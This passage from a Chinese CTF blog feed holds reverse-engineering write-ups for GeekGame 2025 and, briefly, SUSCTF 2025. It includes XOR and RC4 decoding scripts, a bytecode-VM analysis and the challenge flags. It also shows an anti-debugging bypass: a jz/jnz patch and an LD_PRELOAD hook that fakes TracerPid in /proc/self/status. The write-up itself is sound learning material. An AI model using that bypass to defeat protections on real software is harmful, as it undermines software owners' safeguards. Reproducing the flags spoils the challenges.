src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020220947642.png" alt="image-20251020220947642"></p><p>可以看到有个check_debugger</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0x20</span>, <span class="number">0x95</span>, <span class="number">0x44</span>, <span class="number">0x0C</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x94</span>, <span class="number">0xFB</span>,</span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0x70</span>, <span class="number">0x94</span>, <span class="number">0x1A</span>, <span class="number">0xD0</span>, <span class="number">0xA3</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0x42</span>, <span class="number">0x93</span>,</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0xE0</span>, <span class="number">0x4F</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x38</span>, <span class="number">0xC2</span>,</span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x1D</span>, <span class="number">0x6C</span>, <span class="number">0xD1</span>, <span class="number">0xF1</span>, <span class="number">0x22</span>, <span class="number">0x71</span>, <span class="number">0xDE</span>, <span class="number">0xCB</span>, <span class="number">0xD3</span>,</span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x9F</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x71</span>, <span class="number">0x7A</span>, <span class="number">0x64</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x5C</span>, <span class="number">0x7A</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x56</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x56</span>, <span class="number">0x5C</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] ^ <span class="number">0x25</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>in1T_Arr@y_1S_s0_E@sy</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b42095440c4e330794fbfb70941ad0a30a5c429338e04f61151a005138c27d1d6cd1f12271decbd32f3c8b9f61&quot;</span>)</span><br><span class="line">key = <span class="string">b&quot;in1T_Arr@y_1S_s0_E@sy&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line">prev = seed[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(seed)):</span><br><span class="line">    t = ((prev ^ key[i % <span class="built_in">len</span>(key)] ^ <span class="number">0x3C</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    rot = ((t &lt;&lt; ((i &amp; <span class="number">3</span>) + <span class="number">1</span>)) &amp; <span class="number">0xFF</span>) | (t &gt;&gt; (<span class="number">8</span> - ((i &amp; <span class="number">3</span>) + <span class="number">1</span>)))</span><br><span class="line">    flag.append(rot ^ <span class="number">0xA5</span>)</span><br><span class="line">    <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(seed):</span><br><span class="line">        prev = seed[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>flag{iN1t_arR@Y_w1Th_sMc_@NTI_dBg_1s_S0_e@Sy}</p><h4 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h4><p>是个虚拟机逆向</p><p>check_flag2_vm 要求输入长度 0x27；它将 “sneaky_key\n” 拼在 flag 之前放入工作区，再执行一个字节码虚拟机。</p><p>字节码常量见 g_vm_bytecode：</p><ol><li>先对 VM 内存地址 0x100、0x101 设为 0；</li><li>RC4 初始化（opcode 0x40）使用 0x100 处 key 区：由 “sneaky_key\n” 和用户输入拼接而成；</li><li>RC4 生成 keystream 写入 0x400…；</li></ol><p>0x40有个RC4</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020221928541.png" alt="image-20251020221928541"></p><p>opcode 0x40 分支里，把一段缓冲区初始化为 S[i] &#x3D; i，然后循环对 j 进行 j +&#x3D; S[i] + key[i % key_len]，随即交换 S[i] 与 S[j]——这正是 RC4 的 KSA</p><p>0x41加密：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020222003866.png" alt="image-20251020222003866"></p><p>常量区里了有“sneaky_key\n” 作为 key 前缀，与用户输入拼起来给 RC4</p><p>低字节类（<code>v4 &lt;= 0x21</code>）：</p><ul><li><code>0x00</code> — 终止并比较：执行 <code>memcmp(&amp;v52, &amp;g_vm_target_state, 0x27)</code>。</li><li><code>0x01</code> — push 一个 1 字节立即数（下一个字节）。<code>v3 += 2</code>，<code>v47[v2++ + 8] = imm</code>.</li><li><code>0x03</code> — push 一个 32 位常量（从字节流 + table 组合出来）。<code>v3 += 5</code>，<code>v47[v2++ + 8] = const32</code>。这是把复杂常量放到栈上的方法。</li><li><code>0x04</code> — pop（<code>--v2</code>）。</li><li><code>0x05</code> — 复制顶元素：<code>v47[v2 + 8] = v47[v2 + 7]</code> 然后 <code>v2++</code>（把栈顶复制一份）。</li><li><code>0x20</code> — 从 <code>v47[528 + idx]</code> 读取一个字节并 push（<code>idx</code> 由栈值决定）。如果 <code>idx &gt; 0x3FFF</code> 则返回比较失败。</li><li><code>0x21</code> — 把栈顶写入 <code>v47[528 + idx]</code>（即写到 keystream&#x2F;key 区）。如果 <code>idx &gt; 0x3FFF</code> 则返回比较失败。</li></ul><p>高字节类（<code>v4 &gt; 0x21</code>）：在代码里只出现两种</p><ul><li><p><code>0x40</code> — 初始化 S-box（类似 RC4 的 KSA）：</p><p> 从栈弹出若干参数（偏移、key 长度、key 偏移等），在 <code>v48[offset + 0..0xFF]</code> 填入 0..255，然后根据 <code>v47[528 + key_off ..]</code> 的 key 做 256 次交换，最终将置换结果保存在 <code>v48[offset ..]</code>。</p></li><li><p><code>0x41</code> — 产生&#x2F;混合 keystream（RC4 的 PRGA）</p></li></ul><p>因此可以把 VM 中的 <code>0x40</code> + <code>0x41</code> 看成“用存在于 <code>v47[528...]</code> 的 key 初始化 RC4，然后用 RC4 生成一个 keystream并 XOR 到 <code>v47[528 + ...]</code> 的某些位置”。</p><p>可能生成对s盒进行了变换</p><p>只能动调了，把反调试的jz改成jnz后</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024204002172.png" alt="image-20251024204002172"></p><p>运行到这</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024204035479.png" alt="image-20251024204035479"></p><p>向上跟踪到s盒处，把S盒替换了就行</p><p>还有几种可能的思路</p><ol><li>模拟运行</li><li>识别修改处</li><li>把密文patch进去，跑一遍直接看输出</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">content = [</span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x5B</span>, <span class="number">0xE6</span>, <span class="number">0xC0</span>, <span class="number">0xE1</span>, <span class="number">0x1C</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xD3</span>, <span class="number">0xB0</span>,</span><br><span class="line">  <span class="number">0xB4</span>, <span class="number">0xE2</span>, <span class="number">0x87</span>, <span class="number">0x8C</span>, <span class="number">0x10</span>, <span class="number">0x99</span>, <span class="number">0x84</span>, <span class="number">0xBF</span>, <span class="number">0x88</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x40</span>, <span class="number">0x5B</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xA1</span>, <span class="number">0x9D</span>, <span class="number">0xEE</span>, <span class="number">0x3B</span>, <span class="number">0x90</span>,</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0xD4</span>, <span class="number">0x42</span>, <span class="number">0x65</span>, <span class="number">0xEB</span>, <span class="number">0xD7</span>, <span class="number">0x61</span>, <span class="number">0xF5</span>, <span class="number">0xBF</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">rc4number = <span class="number">256</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_endecode</span>(<span class="params">s, content, rc4number</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % rc4number</span><br><span class="line">        j = (j + s[i]) % rc4number</span><br><span class="line">        s[i],s[j] = s[j],s[i]</span><br><span class="line">        t = (s[i] + s[j]) % rc4number</span><br><span class="line">        content[k] = <span class="built_in">chr</span>(content[k] ^ s[t])</span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span>.join(content)</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = [</span><br><span class="line">    <span class="number">0x4</span>,<span class="number">0xE2</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x6A</span>, <span class="number">0xB1</span>, <span class="number">0xFF</span>, <span class="number">0x58</span>, <span class="number">0x51</span>, <span class="number">0x60</span>, <span class="number">0xDD</span>,</span><br><span class="line">    <span class="number">0x56</span>, <span class="number">0xC7</span>, <span class="number">0x35</span>, <span class="number">0xF5</span>, <span class="number">0x1B</span>, <span class="number">0xA5</span>, <span class="number">0x21</span>, <span class="number">0x98</span>, <span class="number">0x5F</span>, <span class="number">0xAB</span>,</span><br><span class="line">    <span class="number">0x2E</span>, <span class="number">0xA9</span>, <span class="number">0x11</span>, <span class="number">0x59</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span>, <span class="number">0x0D</span>, <span class="number">0x4A</span>, <span class="number">0x90</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0xD7</span>, <span class="number">0x84</span>, <span class="number">0x8F</span>, <span class="number">0x2A</span>, <span class="number">0xEA</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x20</span>, <span class="number">0xB8</span>, <span class="number">0x77</span>, <span class="number">0xD2</span>, <span class="number">0x39</span>, <span class="number">0xA3</span>, <span class="number">0x3B</span>, <span class="number">0xD0</span>, <span class="number">0x25</span>, <span class="number">0x8E</span>,</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0x9C</span>, <span class="number">0xBE</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x83</span>, <span class="number">0x9B</span>, <span class="number">0xCC</span>, <span class="number">0x76</span>, <span class="number">0x9D</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x6F</span>, <span class="number">0x8D</span>, <span class="number">0xFD</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>, <span class="number">0xE8</span>, <span class="number">0x1F</span>, <span class="number">0x5A</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0xE5</span>, <span class="number">0xCF</span>, <span class="number">0x29</span>, <span class="number">0xE0</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0xA0</span>, <span class="number">0x86</span>, <span class="number">0x67</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0x4B</span>, <span class="number">0xA2</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x2B</span>, <span class="number">0xDB</span>, <span class="number">0x64</span>, <span class="number">0x68</span>, <span class="number">0xE9</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0xB9</span>, <span class="number">0x8A</span>, <span class="number">0x7E</span>, <span class="number">0x19</span>, <span class="number">0x75</span>, <span class="number">0x96</span>, <span class="number">0x5B</span>, <span class="number">0x13</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0x22</span>, <span class="number">0x5E</span>, <span class="number">0x48</span>, <span class="number">0xDA</span>, <span class="number">0x14</span>, <span class="number">0xAC</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xC5</span>, <span class="number">0xF3</span>, <span class="number">0xAE</span>, <span class="number">0x42</span>, <span class="number">0xB3</span>, <span class="number">0x87</span>, <span class="number">0xF8</span>, <span class="number">0x69</span>, <span class="number">0x44</span>, <span class="number">0xF7</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x80</span>, <span class="number">0xF0</span>, <span class="number">0x1E</span>, <span class="number">0xBB</span>, <span class="number">0x12</span>, <span class="number">0x43</span>, <span class="number">0x07</span>, <span class="number">0xBF</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xC4</span>, <span class="number">0xD9</span>, <span class="number">0xC2</span>, <span class="number">0x31</span>, <span class="number">0x02</span>, <span class="number">0x74</span>, <span class="number">0xFE</span>, <span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xF2</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0xDC</span>, <span class="number">0x34</span>, <span class="number">0xAD</span>, <span class="number">0xF4</span>, <span class="number">0x33</span>, <span class="number">0xBC</span>, <span class="number">0xD5</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0xD8</span>, <span class="number">0xD1</span>, <span class="number">0xB5</span>, <span class="number">0x09</span>, <span class="number">0x2F</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0xE6</span>, <span class="number">0xED</span>, <span class="number">0x70</span>, <span class="number">0x2C</span>, <span class="number">0x15</span>, <span class="number">0xB7</span>, <span class="number">0xC9</span>, <span class="number">0xA8</span>, <span class="number">0x94</span>, <span class="number">0x61</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x91</span>, <span class="number">0xCE</span>, <span class="number">0x7F</span>, <span class="number">0x6B</span>, <span class="number">0x54</span>, <span class="number">0x26</span>, <span class="number">0xB6</span>, <span class="number">0x01</span>, <span class="number">0xD3</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0xC8</span>, <span class="number">0x85</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x7B</span>, <span class="number">0x72</span>, <span class="number">0x40</span>, <span class="number">0x53</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x37</span>, <span class="number">0xE3</span>, <span class="number">0x71</span>, <span class="number">0xA6</span>, <span class="number">0xE4</span>, <span class="number">0x95</span>, <span class="number">0x4E</span>, <span class="number">0x79</span>, <span class="number">0xF6</span>,</span><br><span class="line">    <span class="number">0x7C</span>, <span class="number">0xCB</span>, <span class="number">0x55</span>, <span class="number">0xBA</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x50</span>, <span class="number">0x4C</span>, <span class="number">0x7D</span>, <span class="number">0x93</span>,</span><br><span class="line">    <span class="number">0xE1</span>, <span class="number">0x24</span>, <span class="number">0xA7</span>, <span class="number">0xD6</span>, <span class="number">0x9E</span>, <span class="number">0x9F</span>, <span class="number">0x3C</span>, <span class="number">0xF1</span>, <span class="number">0x45</span>, <span class="number">0xEC</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x7A</span>, <span class="number">0x6E</span>, <span class="number">0x8C</span>, <span class="number">0x57</span>, <span class="number">0xFC</span>, <span class="number">0x38</span>, <span class="number">0x63</span>, <span class="number">0x1C</span>, <span class="number">0xDF</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x4D</span>, <span class="number">0x06</span>, <span class="number">0x18</span>, <span class="number">0xC6</span>, <span class="number">0x23</span>, <span class="number">0x2D</span>, <span class="number">0x47</span>, <span class="number">0xA4</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x6D</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x62</span>, <span class="number">0xB0</span>, <span class="number">0xEF</span>, <span class="number">0x3D</span>, <span class="number">0xEB</span>, <span class="number">0xE7</span>,</span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0x03</span>, <span class="number">0x97</span>, <span class="number">0xC3</span>, <span class="number">0xEE</span></span><br><span class="line">]</span><br><span class="line">rc4_endecode(s, content, rc4number)</span><br></pre></td></tr></table></figure><p>flag{EAsy_vm_usINg_rC4_ALGo_1S_S0_e@SY}</p><blockquote><p>又回去看了遍生成S盒没有变动，那我应该就是key搞错了，key是sneaky_key，而非’&#x2F;nsneaky_key’，因为我发现生成S盒的%0xA而非0xB，所以猜测第一个不是密钥😂</p></blockquote><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251025112011467.png" alt="image-20251025112011467"></p><p>关于本题还有其他的反反调试手段这里记录下。程序读取的是这里的TraceID来实现检测</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251024212657134.png" alt="image-20251024212657134"></p><p>我们把它hook掉就行</p><blockquote><p>看TracePid说明当前进程已经被 PID 9467 跟踪 —— 的确存在调试&#x2F;ptrace。</p></blockquote><p>让AI给了一份脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hide_tracer.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> FILE *(*<span class="type">fopen_t</span>)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">fopen_t</span> real_fopen = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 生成一个假的 /proc/self/status 内容，其中保证包含 TracerPid: 0 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> fake_status[] =</span><br><span class="line"><span class="string">&quot;Name:\tmyproc\n&quot;</span></span><br><span class="line"><span class="string">&quot;State:\tR (running)\n&quot;</span></span><br><span class="line"><span class="string">&quot;Pid:\t1234\n&quot;</span></span><br><span class="line"><span class="string">&quot;PPid:\t1\n&quot;</span></span><br><span class="line"><span class="string">&quot;TracerPid:\t0\n&quot;</span>   <span class="comment">/* &lt;-- 关键：返回 0 表示未被调试 */</span></span><br><span class="line"><span class="string">&quot;Uid:\t1000\t1000\t1000\t1000\n&quot;</span></span><br><span class="line"><span class="string">&quot;VmSize:\t0 kB\n&quot;</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 替换 fopen，只在 path == &quot;/proc/self/status&quot; 时返回内存 FILE* */</span></span><br><span class="line">FILE *<span class="title function_">fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!real_fopen) &#123;</span><br><span class="line">        real_fopen = (<span class="type">fopen_t</span>)dlsym(RTLD_NEXT, <span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path &amp;&amp; <span class="built_in">strcmp</span>(path, <span class="string">&quot;/proc/self/status&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* fmemopen 在 glibc 可用：把字符串当作 FILE* 返回 */</span></span><br><span class="line">        <span class="comment">/* 注意：fmemopen 需要可写缓冲区，因此复制一份到 malloc 的区域 */</span></span><br><span class="line">        <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">if</span> (!buf) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, fake_status, <span class="keyword">sizeof</span>(fake_status));</span><br><span class="line">        <span class="keyword">return</span> fmemopen(buf, <span class="keyword">sizeof</span>(fake_status) - <span class="number">1</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 其他文件按真实 fopen 处理 */</span></span><br><span class="line">    <span class="keyword">return</span> real_fopen(path, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个最大的坑点是，远程调试需要用这个命令去设置环境变量启动调试器，在Parameters里设置没有用!!!：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o hide_tracer.so hide_tracer.c -ldl</span><br><span class="line">LD_PRELOAD=/home/matriy/RE/TSCTF/hide_tracer.so ./linux_server64</span><br></pre></td></tr></table></figure><p>这里还有个没注意到的点</p><p>test指令并不是跟网上说的那样用来比较的，而是一个位操作的指令</p><p>用于将寄存器 edx 与自身进行按位与操作。这其实是一个快捷方式，用来测试寄存器的内容是否为零</p><p>test 指令的执行结果会影响 CPU 的标志位，特别是 ZF（零标志位）。</p><p>如t</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251025200129278.png" alt="image-20251025200129278"></p><p>若 edx 的值是零，test edx, edx 的结果也会是零，进而设置 ZF 标志。如果 edx 的值不是零，ZF 标志不会被设置。</p><p>jne 0040BCA3 仅在 ZF 未被设置时（即 edx 不为零时）执行跳转。如果 edx 是零，则跳</p><p>简单的来说就是，<strong>当运算的结果值为 0 时，ZF &#x3D; 1</strong></p><p>edx &#x3D; 0 zf &#x3D; 1 不执行跳转(因为zf &#x3D; 1时je跳转 jne不跳)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GeekGame-2025-re-wp&quot;&gt;&lt;a href=&quot;#GeekGame-2025-re-wp&quot; class=&quot;headerlink&quot; title=&quot;GeekGame 2025 re wp&quot;&gt;&lt;/a&gt;GeekGame 2025 re wp&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>SUSCTF 2025 wp</title>
    <link href="http://matriy330.github.io/519e5256/"/>
    <id>http://matriy330.github.io/519e5256/</id>
    <published>2025-10-18T15:00:00.000Z</published>
    <updated>2025-10-19T11:36:57.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SUSCTF-wp"><a href="#SUSCTF-wp" class="headerlink" title="SUSCTF wp"></a>SUSCTF wp</h1><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006220901737.png" alt="image-20251006220901737"></p><p>那几道逆向不太想复现了</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><p>问卷</p><h3 id="easyjail"><a href="#easyjail" class="headerlink" title="easyjail"></a>easyjail</h3><p>AI直出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 